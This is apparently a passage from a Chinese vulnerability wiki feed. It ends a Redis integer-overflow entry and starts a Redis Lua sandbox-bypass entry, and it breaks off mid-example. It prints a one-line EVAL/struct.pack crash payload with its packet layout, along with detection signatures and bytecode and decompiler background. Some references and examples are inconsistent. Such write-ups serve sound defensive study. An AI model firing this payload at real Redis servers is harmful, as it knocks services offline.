攻击包为RESP协议，Redis默认监听在6379，使用Redis命令，Redis命令详解请看 3.1技术背景。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3表示创建一个大小为3的数组</span><br><span class="line">$4</span><br><span class="line">EVAL 表示创建长度为4的字符串,值为EVAL</span><br><span class="line">$42</span><br><span class="line">struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;) 同上</span><br><span class="line">$1</span><br><span class="line">0同上</span><br></pre></td></tr></table></figure><p>​        流量结构等同于在Redis客户端输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;struct.pack(&#x27;&lt;4294967295&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/22.png"></p><p>​        之后无返回数据，则说明拒绝服务攻击成功。</p><h4 id="正常包分析"><a href="#正常包分析" class="headerlink" title="正常包分析"></a>正常包分析</h4><p>​        Redis客户端发送RESP命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;struct.pack(&#x27;&lt;I1&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/25.png"></p><p>​        正常包是符合RESP协议，会有回显。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/24.png"></p><h2 id="漏洞检测和防御"><a href="#漏洞检测和防御" class="headerlink" title="漏洞检测和防御"></a>漏洞检测和防御</h2><h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>​        缓冲区溢出漏洞只能通过版本对比检测。</p><p>​        运行Redis-server后，控制台会打印版本信息，通过版本比对，若版本低于6.0.3，则有漏洞。</p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/26.png"></p><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>​        匹配6379端口的流量，匹配字符串的RESP数组。 由于RESP数组始终以“ *”字符开头，对该字符进行字符串匹配。 检测数组的元素是否有EVAL或SCRIPT LOAD命令。</p><p>​        然后，检测调用struct.pack（）方法的数组中匹配Lua脚本代码，并提取该方法的第一个参数。 必须确保此字符串参数的前两个字节包含以下任何字符：“ I”，“ i”，“ &lt;”或““&gt;”。 如果此值大于0x7FFFFFFF，则应将流量视为恶意流量，并且可能正在利用此漏洞进行攻击。</p><ul><li>必须以区分大小写的方式对Lua脚本代码中的对象和方法名称进行字符串匹配。</li><li>必须以不区分大小写的方式执行RESP协议上的字符串匹配。</li><li>由于脚本语言的性质，使用各种脚本技术很容易混淆代码的真实攻击。 </li></ul><h4 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p><a href="https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571">https://github.com/antirez/redis/commit/ef764dde1cca2f25d00686673d1bc89448819571</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14147">https://nvd.nist.gov/vuln/detail/CVE-2020-14147</a></li><li><a href="https://download.redis.io/releases/">https://download.redis.io/releases/</a></li><li><a href="https://redis.io/download">https://redis.io/download</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h2&gt;&lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="1. 漏洞相关" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"/>
    
    <category term="Redis" scheme="http://example.com/categories/1-%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"/>
    
    
    <category term="Redis" scheme="http://example.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</title>
    <link href="http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-06T08:21:23.000Z</published>
    <updated>2021-07-06T08:46:19.854Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><ul><li>漏洞名称：Redis EVAL Lua沙箱绕过漏洞</li><li>漏洞编号：CVE-2015-4335</li><li>漏洞类型：代码注入</li><li>CVSS评分：【CVSS v2.0：10.0】【CVSS v3.0：】</li><li>漏洞危害等级：高危</li></ul><h3 id="组件概述"><a href="#组件概述" class="headerlink" title="组件概述"></a>组件概述</h3><p>​        Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>​        它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码。</p><h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>Redis:up to 2.8.20</p><p>Redis:3.0.0 up to 3.0.1</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a href="https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411">https://github.com/redis/redis/commit/fdf9d455098f54f7666c702ae464e6ea21e25411</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="应用协议"><a href="#应用协议" class="headerlink" title="应用协议"></a>应用协议</h3><p>6379/RESP（Redis的序列化协议）</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/23.png"></p><p><img src="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/10.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="技术背景"><a href="#技术背景" class="headerlink" title="技术背景"></a>技术背景</h3><p>​        Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 </p><p>​        例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET 1234 TEST</span><br><span class="line">GETSET 1234 TEST2</span><br><span class="line">GET 1234</span><br></pre></td></tr></table></figure><p>​        有关Redis命令的完整列表，请参考 <a href="http://redis.io/commands">http://redis.io/commands</a></p><p>​        Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 <a href="http://redis.io/topics/protocol%E8%8E%B7%E5%BE%97%E8%AF%A5%E5%8D%8F%E8%AE%AE%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8E%E3%80%82">http://redis.io/topics/protocol获得该协议详细说明。</a> RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识：</p><ul><li><p>简单字符串以“ +”字符开头</p></li><li><p>错误以“-”字符开头</p></li><li><p>整数以“：”字符开头</p></li><li><p>批量字符串以“ $”字符开头</p></li><li><p>数组以“ *”字符开头</p><p>​    批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$7 CRLF</span><br><span class="line">TELUS</span><br></pre></td></tr></table></figure><p>​        其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 </p><p>​        RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*2 CRLF</span><br><span class="line">$7 CRLF</span><br><span class="line">Sangfor CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3 CRLF</span><br><span class="line">$3 CRLF</span><br><span class="line">SET CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">1234 CRLF</span><br><span class="line">$4 CRLF</span><br><span class="line">TEST CRLF</span><br></pre></td></tr></table></figure><p>​        <strong>Lua</strong>是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考<a href="https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/">https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/</a></p><p>​        Redis客户端可通过EVAL命令使用此解释器。 Lua脚本允许用户管理和操纵Redis服务器上的记录。 例如，以下Lua脚本可用于执行上述SET命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EVAL &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br></pre></td></tr></table></figure><p>​        执行此Lua脚本的另一种方法是使用SCRIPT LOAD和EVALSHA命令。 SCRIPT LOAD命令在服务器上缓存Lua脚本，并返回SHA1摘要。 EVALSHA命令可以与此SHA1摘要一起用作执行脚本的参数。 下面是一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT LOAD &quot;redis.call(&#x27;set&#x27;,&#x27;1234&#x27;,&#x27;TEST&#x27;)&quot; 0</span><br><span class="line">EVALSHA &lt;SHA1 digest from above&gt;</span><br></pre></td></tr></table></figure><p>​        Lua还提供了分别使用struct.pack和struct.unpack方法将Lua变量与C类型的Stucts相互转换的方法。 例如，以下内容可用于包装整数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">struct.pack (&quot;&lt;I2&quot;, 10)</span><br></pre></td></tr></table></figure><ul><li>“I”指定整数是无符号的（“ i”用于有符号整数）</li><li>“&lt;”指定应以小端格式表示（“&gt;”用于大端格式）</li><li>“2”指定整数为2个字节长</li><li>“10”指定要打包的整数的值</li></ul><p><strong>ZADD key score member [[score member] [score member] …]</strong></p><blockquote><p>可用版本： &gt;= 1.2.0</p><p>时间复杂度: O(M*log(N))， <code>N</code> 是有序集的基数， <code>M</code> 为成功添加的新成员的数量。</p></blockquote><p>将一个或多个 <code>member</code> 元素及其 <code>score</code> 值加入到有序集 <code>key</code> 当中。</p><p>如果某个 <code>member</code> 已经是有序集的成员，那么更新这个 <code>member</code> 的 <code>score</code> 值，并通过重新插入这个 <code>member</code> 元素，来保证该 <code>member</code> 在正确的位置上。</p><p><code>score</code> 值可以是整数值或双精度浮点数。</p><p>如果 <code>key</code> 不存在，则创建一个空的有序集并执行 <a href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 操作。</p><p>当 <code>key</code> 存在但不是有序集类型时，返回一个错误。</p><p>对有序集的更多介绍请参见 <a href="http://redis.io/topics/data-types#sorted-sets">sorted set</a> 。</p><p>Note：在 Redis 2.4 版本以前， <a href="http://redisdoc.com/sorted_set/zadd.html?highlight=zadd#zadd"><strong>ZADD</strong></a> 每次只能添加一个元素。</p><p><strong>返回值</strong></p><p>被成功添加的新成员的数量，不包括那些被更新的、已经存在的成员。</p><p><strong>代码示例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 添加单个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加多个元素</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 9 baidu.com 8 bing.com</span><br><span class="line">(integer) 2</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，且 score 值不变</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 10 google.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # 没有改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;8&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加已存在元素，但是改变 score 值</span><br><span class="line"></span><br><span class="line">redis&gt; ZADD page_rank 6 bing.com</span><br><span class="line">(integer) 0</span><br><span class="line"></span><br><span class="line">redis&gt; ZRANGE page_rank 0 -1 WITHSCORES  # bing.com 元素的 score 值被改变</span><br><span class="line">1) &quot;bing.com&quot;</span><br><span class="line">2) &quot;6&quot;</span><br><span class="line">3) &quot;baidu.com&quot;</span><br><span class="line">4) &quot;9&quot;</span><br><span class="line">5) &quot;google.com&quot;</span><br><span class="line">6) &quot;10&quot;</span><br></pre></td></tr></table></figure><p>LuaDec是lua 5.1的Lua反编译器，并且是lua 5.2和5.3的实验版。它基于Hisham Muhammad的luadec，其针对Zsolt Sz的lua 5.0.x和LuaDec51。Sztupak。</p><p>LuaDec是免费软件，并且使用与原始LuaDec相同的许可证。</p><p><strong>编译中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/viruscamp/luadec</span><br><span class="line">cd luadec</span><br><span class="line">git submodule update --init lua-5.1</span><br><span class="line">cd lua-5.1</span><br><span class="line">make linux</span><br><span class="line">cd ../luadec</span><br><span class="line">make LUAVER=5.1</span><br></pre></td></tr></table></figure><p>如果要为lua 5.2或5.3构建它，只需将上面的5.1替换为5.2或5.3。</p><p>还有vc2008的项目文件，已针对vc2008和vc2013进行了测试。<br>编译之前，请确保lua-5.1，lua-5.2或lua-5.3中的源正确。</p><p><strong>用法</strong></p><ul><li>反编译lua二进制文件：<br>luadec abc.luac</li><li>反编译lua源文件以进行测试和比较：<br>luadec abc.lua</li><li>反汇编lua源代码或二进制<br>luadec -dis abc.lua</li><li>-pn打印嵌套函数结构，-fn可以使用</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">luadec -pn test.lua</span><br><span class="line">0</span><br><span class="line">  0_0</span><br><span class="line">    0_0_0</span><br><span class="line">  0_1</span><br></pre></td></tr></table></figure><ul><li>-f仅反编译特定的嵌套函数<br>luadec -f 0_1 test.lua</li><li>-ns不处理子函数<br>luadec -ns -f 0_1 test.lua</li><li>-fc对每个函数<br>luadec -fc test.lua进行逐条指令比较<br>：输出<br>-函数检查通过0-<br>函数检查失败0_0：无法编译<br>-函数检查失败0_1：不同的代码大小；sizecode组织：66；反编译：67；相同：47；</li></ul><p>还有更多选项，通常用于调试目的，或用于内置本地猜测器猜测错误的情况。使用-h获取可用参数的完整列表</p><p><strong>lua的字节码</strong></p><p>​    lua源码在执行前，会被编译为字节码，字节码能加快程序的加载，保存lua源码被意外的修复。lua的字节码只在具有相同的字长和字节顺序的机器上能够移植。<br>​        luac编译器能将lua源码编译为字节码二进制文件，其命令如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac a.lua</span><br></pre></td></tr></table></figure><p>​        luac默认的输出文件为luac.out,可以通过 -o 选项来指定输出文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">luac -o a.out a.lua</span><br></pre></td></tr></table></figure><p>​        当Lua发布新版时，luac生成的二进制文件的内部格式可能改变。</p><p><strong>字节码文件头</strong></p><p><strong>lua5.1</strong>字节码文件头的长度为12字节，Win7 64位，VS下编译为Win32应用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5100 0104 0404 0800</span><br></pre></td></tr></table></figure><p>其中第1-4字节为：”\033Lua”；第5字节标识lua的版本号，lua5.1为 0x51；第6字节为官方中保留，lua5.1中为 0x0；<br>第7字节标识字节序，little-endian为0x01，big-endian为0x00；<br>第8字节为sizeof(int)；第9字节为sizeof(size_t)；第10字节为sizeof(Instruction)，Instruction为lua内的指令类型，在32位以上的机器上为unsigned int；第11字节为sizeof(lua_Number)，lua_Number即为double;<br>第12字节是判断lua_Number类型起否有效，一般为 0x00;</p><p><strong>lua5.2</strong>字节码文件头的长度为18字节，在我的环境里(Win7 64位，VS下编译为Win32应用)如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1b4c 7561 5200 0104 0404 0800 1993 0d0a 1a0a</span><br></pre></td></tr></table></figure><p>其中第1-12字节与lua5.1意义相同，第5字节在lua5.2中为 0x52；<br>第13-18字节是为了捕获字节码的转换错误而设置的，其值为 “\x19\x93\r\n\x1a\n”；</p><p>PS:lua在判断字节序时使用的方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 void luaU_header (char* h)</span><br><span class="line">2 &#123;</span><br><span class="line">3     int x=1;</span><br><span class="line">4     //...</span><br><span class="line">5     *h++=(char)*(char*)&amp;x;             /* endianness */</span><br><span class="line">6     //...</span><br><span class="line">7 &#125;</span><br></pre></td></tr></table></figure><p>在little-endian时，*(char*)&amp;x值为0x01；big-endian时，*(char*)&amp;x值为 0x00；</p><p><strong>字节码文件正文</strong></p><p>​        <strong>lua5.1</strong> 在文件头之后，就是正头，它由一个个函数组成，其中第一个函数包含由文件内全部内容，引全局函数名为”@”+文件件名(包含”.lua”后缀)，在此文件中定义的函数都会在全局函数中以常量字符串保存；<br>每个函数的内容缓存如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">源文件名的长度(包括&#x27;\0&#x27;)，为sizeof(size_t)个字节长，只有全局函数有源文件名，其它内部函数其长度填0；</span><br><span class="line">源文件名(包括\0)，长度为长度*sizeof(char)个字节；</span><br><span class="line">函数行数，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的最后一行，全局函数的填0，长度为sizeof(int)个字节；</span><br><span class="line">函数的upvalues数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的参数个数，全局函数的填0，长度为sizeof(char)个字节；</span><br><span class="line">函数的vararg个数，只有全局函数有；</span><br><span class="line">函数最大的栈数目，长度为sizeof(char)个字节；</span><br><span class="line">函数的指令数目，长度为sizeof(int)个字节；</span><br><span class="line">函数的指令，长度为指令数目*sizeof(Instruction)个字节；</span><br><span class="line">函数中常量的数目，长度为sizeof(int)个字节；</span><br><span class="line">函数中的常量，长度为常量数目*(常量类似标识长度+指定常量点用的长度)，常量类似标识长度为sizeof(char)个字节；</span><br><span class="line">函数中的内部函数数目，长度为sizeof(int)个字节；</span><br><span class="line">内部函数的定，格式同外部函数；</span><br><span class="line">函数的调试信息；</span><br></pre></td></tr></table></figure><p>​        文件binc.lua的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 local i = 6;</span><br><span class="line">2 return 1;</span><br></pre></td></tr></table></figure><p>​        其正文的字节码(lua5.1编译，不包括调试信息,前面的空白外为文件头)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">                              0a00 0000</span><br><span class="line">4062 696e 632e 6c75 6100 0000 0000 0000</span><br><span class="line">0000 0000 0202 0400 0000 0100 0000 4140</span><br><span class="line">0000 5e00 0001 1e00 8000 0200 0000 0300</span><br><span class="line">0000 0000 0018 4003 0000 0000 0000 f03f</span><br><span class="line">0000 0000</span><br></pre></td></tr></table></figure><p>​        <strong>lua5.2</strong> 的正文部分与lua5.1存在差别。其没有源文件名的说明，别对于upvalue的处理也不一样，lua5.2中upvalue在常量后面定义，由upvalue的数目后加上分upvalue的定义组成。</p><p><strong>string.gsub()</strong></p><ul><li>原型：string.gsub (s, pattern, repl [,m])</li><li>解释：这个函数会返回一个替换后的副本，原串中所有的符合参数<code>pattern</code>的子串都将被参数<code>repl</code>所指定的字符串所替换，如果指定了参数<code>m</code>，那么只替换查找过程的前<code>m</code>个匹配的子串，参数<code>repl</code>可以是一个字符串、表、或者是函数，并且函数可以将匹配的次数作为函数的第二个参数返回，接下来看看参数<code>repl</code>的含义：</li><li>如果参数<code>repl</code>是一个常规字符串，成功匹配的子串会被<code>repl</code>直接替换，如果参数<code>repl</code>中包含转移字符<code>%</code>，那么可以采用<code>%n</code>的形式替换，当<code>%n</code>中的<code>n</code>取值1-9时，表示一次匹配中的第n个子串，当其中的<code>n</code>为0时，表示这次匹配的整个子串，<code>%%</code>表示一个单独的<code>%</code>。</li><li>如果参数<code>repl</code>是一个表，那么每次匹配中的第一个子串将会作为整个表的键，取table[匹配子串]来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为table的键值。</li><li>如果参数<code>repl</code>是一个函数，那么每一次匹配的子串都将作为整个函数的参数，取function(匹配子串)来替换所匹配出来的子串，当匹配不成功时，函数会使用整个字符串来作为函数的参数。如果函数的返回值是一个数字或者是字符串，那么会直接拿来替换，如果它返回<code>false</code>或者<code>nil</code>，替换动作将不会发生，如果返回其他的值将会报错。</li></ul><hr><p><strong>Usage</strong></p><ul><li>首先新建一个文件将文件命名为gsubtest.lua然后编写如下代码：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-- 常规替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;lua&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 都用匹配的第一个串*2来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;(%w+)&quot;</span>, <span class="string">&quot;%1 %1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 用匹配出的完成串*2来替换第一次匹配的结果</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world&quot;</span>, <span class="string">&quot;%w+&quot;</span>, <span class="string">&quot;%0 %0&quot;</span>, 1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 使用一个完整匹配和一个匹配的第二个串来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;hello world from c to lua&quot;</span>, <span class="string">&quot;(%w+) (%a+)&quot;</span>, <span class="string">&quot;%0 %2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">-- 调用系统函数来替换</span><br><span class="line">x = string.gsub(<span class="string">&quot;os = <span class="variable">$OS</span>, pathext = <span class="variable">$PATHEXT</span>&quot;</span>, <span class="string">&quot;%<span class="subst">$(%w+)</span>&quot;</span>, os.getenv)</span><br><span class="line"><span class="built_in">print</span>(<span 